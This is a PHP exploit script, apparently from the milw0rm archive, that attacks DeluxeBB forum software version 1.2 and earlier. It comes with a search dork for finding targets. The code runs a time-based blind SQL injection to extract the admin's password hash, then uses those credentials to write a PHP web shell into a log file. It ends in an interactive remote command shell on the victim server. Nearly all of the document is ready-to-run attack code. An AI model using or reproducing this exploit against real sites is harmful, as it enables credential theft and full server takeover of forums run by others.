<?php

/*
	-------------------------------------------------------
	DeluxeBB <= 1.2 Multiple Remote Vulnerabilities Exploit
	-------------------------------------------------------
	
	author...: EgiX
	mail.....: n0b0d13s[at]gmail[dot]com
	
	link.....: http://www.deluxebb.com/
	dork.....: allintitle: powered by DeluxeBB

	[-] Blind SQL injection (BENCHMARK() method) in /forums.php
	
	108.	if(!$sort) {
	109.		$sort = 'DESC';
	110.	} elseif($sort=='ASC' || $sort=='DESC') {
	111.		$add .= '&sort='.$sort;
	112.	}
	113.	
	114.	//calculating pages and navigation
	115.	$current_count = 0;
	116.	$tppt = $settings['tppt'];
	117.	
	118.	//caching censors
	119.	if($settings['censors']!=0) {
	120.		bbcodecache();
	121.	}
	122.	
	123.	//forum info
	124.	$rows = $db->query("SELECT COUNT(tid) FROM ".$prefix."threads WHERE (lastpostdate>='$posttime' && fid='$fid')");
	125.	$nrows = $db->result($rows);
	126.	
	127.	$pageinfo = multipage($nrows, $page, $settings['tppf'], "forums.php?fid=$fid");
	128.	
	129.	include($templatefolder.'/forums_header.dtf');
	130.	
	131.	//get and format all threads
	132.	$threads = $db->query("SELECT t.*,u.username FROM ".$prefix."threads t LEFT JOIN ".$prefix."users u ON (t.author=u.uid) 
		WHERE (t.fid='$fid' && t.lastpostdate>='$posttime') ORDER BY t.pinned $sort,t.lastpostdate $sort LIMIT $pageinfo[0], $pageinfo[1]");
			
	$sort variable isn't properly sanitised, so an attacker could be inject (with MySQL >= 4.1 that
	allows subqueries) SQL code in a subquery after 'ORDER BY' statement, in the query at line 132

	[-] PHP injection by privilege escalation in /admincp.php
	
	29.	if($settings['cplog']==1 || $logs==1) {
	30.		$time = time();
	31.		$dir = $settings['logpath'];
	32.		@chmod($dir.'/cp.php', 0777);
	33.		$string = $_COOKIE['membercookie']."|##|$ip|##|$time|##|$REQUEST_URI\n";
	34.		$filehandle=@fopen($dir.'/cp.php',"a");
	35.		if(!$filehandle) {
	36.			message($lang_wrongfilepermission, $lang_plschmod);
	37.		}
	38.		@flock($filehandle, 2);
	39.		@fwrite($filehandle, $string);
	40.		@fclose($filehandle);
	41.	}	
	
	with admin credentials, an attacker could be inject PHP code into cp.php log file by $REQUEST_URI
*/

error_reporting(0);
set_time_limit(0);
ini_set("default_socket_timeout", 5);

function http_send($host, $packet)
{
	$sock = fsockopen($host, 80);
	while (!$sock)
	{
		print "\n[-] No response from {$host}:80 Trying again...";
		$sock = fsockopen($host, 80);
	}
	fputs($sock, $packet);
	while (!feof($sock)) $resp .= fread($sock, 1024);
	fclose($sock);
	return $resp;
}

function getmicrotime()
{ 
	list($usec, $sec) = explode(" ", microtime()); 
	return ((float)$usec + (float)$sec); 
}

function getdelay($query)
{
	global $host, $path;
	
	$query  = urlencode($query);
	$packet = "GET {$path}forums.php?fid=1&sort={$query} HTTP/1.0\r\n";
	$packet.= "Host: {$host}\r\n";
	$packet.= "Connection: close\r\n\r\n";
	$start = getmicrotime()*1000;
	http_send($host, $packet);
	$end = getmicrotime()*1000;

	return ($end - $start);
}

function normaldelay()
{
	global $count, $prefix, $uid;
	
	$sql = ",(SELECT pass FROM {$prefix}_users WHERE uid={$uid} AND RAND(IF(1=0,BENCHMARK({$count},MD5(1)),0)))/*";
	$d1 = getdelay($sql);
	$d2 = getdelay($sql);
	$d3 = getdelay($sql);
	$m = ($d1 + $d2 + $d3) / 3;
	
	return (intval($m));
}

function benchmarkdelay()
{
	global $count, $prefix, $uid;
   
	$sql = ",(SELECT pass FROM {$prefix}_users WHERE uid={$uid} AND RAND(IF(1=1,BENCHMARK({$count},MD5(1)),0)))/*";
	$d1 = getdelay($sql);
	$d2 = getdelay($sql);
	$d3 = getdelay($sql);
	$m = ($d1 + $d2 + $d3) / 3;
	
	return (intval($m));
}

function getuserinfo($uid)
{
	global $host, $path;
	
	$packet = "GET {$path}misc.php?sub=profile&uid={$uid} HTTP/1.0\r\n";
	$packet.= "Host: {$host}\r\n";
	$packet.= "Connection: close\r\n\r\n";
	preg_match_all("/<span class=\"misctext\">(.*)<\/span>/", http_send($host, $packet), $split);
	
	return $split[1];
}

print "\n+-----------------------------------------------------------------+";
print "\n| DeluxeBB <= 1.2 Multiple Remote Vulnerabilities Exploit by EgiX |";
print "\n+-----------------------------------------------------------------+\n";

if ($argc < 3)
{
	print "\nUsage......:	php $argv[0] host path [options]\n";
	print "\nhost.......:	target server (ip/hostname)";
	print "\npath.......:	path to DeluxeBB directory (example: / or /deluxebb/)\n";
	print "\n-h hash....:	MD5 hash of admin (to find with SQL injection)";
	print "\n-d delay...:	delay for BENCHMARK() (dafault: 500000)";
	print "\n-u uid.....:	id of an admin user (default: 1)";
	print "\n-t prefix..:	table's prefix (default: deluxebb)\n";
	print "\nExample....:	php $argv[0] localhost /deluxebb/ -d 250000 -t my_prefix";
	print "\nExample....:	php $argv[0] localhost / -h 098f6bcd4621d373cade4e832627b4f6 -u 5\n";
	die();
}

$host	= $argv[1];
$path	= $argv[2];

$opt	= array("-h", "-d", "-u", "-t");
$md5	= "";
$count	= "500000";
$uid	= "1";
$prefix = "deluxebb";

for ($i = 3; $i < $argc; $i++)
{
	if ($argv[$i] == "-h") if (isset($argv[$i+1]) && !in_array($argv[$i+1], $opt)) $md5 = $argv[++$i];
	if ($argv[$i] == "-d") if (isset($argv[$i+1]) && !in_array($argv[$i+1], $opt)) $count = $argv[++$i];
	if ($argv[$i] == "-u") if (isset($argv[$i+1]) && !in_array($argv[$i+1], $opt)) $uid = $argv[++$i];
	if ($argv[$i] == "-t") if (isset($argv[$i+1]) && !in_array($argv[$i+1], $opt)) $prefix = $argv[++$i];	
}

if (!strlen($md5))
{
	print "\n[-] Testing delay time...";
	$ndelay = normaldelay();
	$adelay = $ndelay * 3;
	print "\n[-] Normal delay: {$ndelay} ms";
	$bdelay = benchmarkdelay();
	print "\n[-] Benchmark delay: {$bdelay} ms (this value must be greater then {$adelay} ms)\n";
	
	$user_info = getuserinfo($uid);
	print "\n[-] Username: {$user_info[1]}";
	if (strtolower($user_info[3]) != "head admin") die("\n\n[-] '{$user_info[1]}' is not admin!\n");

	$hash = array(0,48,49,50,51,52,53,54,55,56,57,97,98,99,100,101,102);
	$index = 1; $md5 = "";
	print "\n[-] MD5 Hash: ";
	
	while (!strpos($md5, chr(0)))
	{
		for ($i = 0, $n = count($hash); $i <= $n; $i++)
		{
			if ($i == $n) die("\n\n[-] Exploit failed...\n");
			$sql = ",(SELECT pass FROM {$prefix}_users WHERE uid={$uid} AND RAND(IF((ORD(SUBSTR(pass,{$index},1))={$hash[$i]}),BENCHMARK({$count},MD5(1)),1)))/*";
			if (getdelay($sql) > $adelay) { $md5 .= chr($hash[$i]); print chr($hash[$i]); break; }
		}
	
		$index++;
	}
	
	if (!eregi("[0-9,a-f]{32}", $md5)) die("\n\n[-] Invalid MD5 hash...\n");
}
else
{
	$user_info = getuserinfo($uid);
	print "\n[-] Username: {$user_info[1]}\n[-] MD5 Hash: {$md5}";
	if (strtolower($user_info[3]) != "head admin") die("\n\n[-] '{$user_info[1]}' is not admin!\n");
}
	
print "\n\n[-] Trying to inject PHP code with admin credentials...\n";

$code	= "<?php;\${print(_code_)}.\${passthru(base64_decode(\$_SERVER[HTTP_CMD]))}.\${print(_code_)}?>";
$packet = "GET {$path}admincp.php?{$code} HTTP/1.0\r\n";
$packet.= "Host: {$host}\r\n";
$packet.= "Cookie: memberid={$uid}; membercookie={$user_info[1]}; memberpw={$md5}\r\n";
$packet.= "Connection: close\r\n\r\n";
http_send($host, $packet);

$packet = "GET {$path}logs/cp.php HTTP/1.0\r\n";
$packet.= "Host: {$host}\r\n";
$packet.= "Connection: close\r\n\r\n";
$html	= http_send($host, $packet);

if (!ereg("_code_", $html)) die("\n[-] Exploit failed...\n");
else print "[-] Shell injected! Starting it...\n";

define(STDIN, fopen("php://stdin", "r"));

while(1)
{
	print "\ndeluxebb-shell# ";
	$cmd = trim(fgets(STDIN));
	if ($cmd != "exit")
	{
		$packet = "GET {$path}logs/cp.php HTTP/1.0\r\n";
		$packet.= "Host: {$host}\r\n";
		$packet.= "Cmd: ".base64_encode($cmd)."\r\n";
		$packet.= "Connection: close\r\n\r\n";
		$html   = http_send($host, $packet);
		if (!ereg("_code_", $html)) die("\n[-] Exploit failed...\n");
		$shell = explode("_code_", $html);
		print "\n".$shell[1];
	}
	else break;
}

?>

# milw0rm.com [2008-05-05]
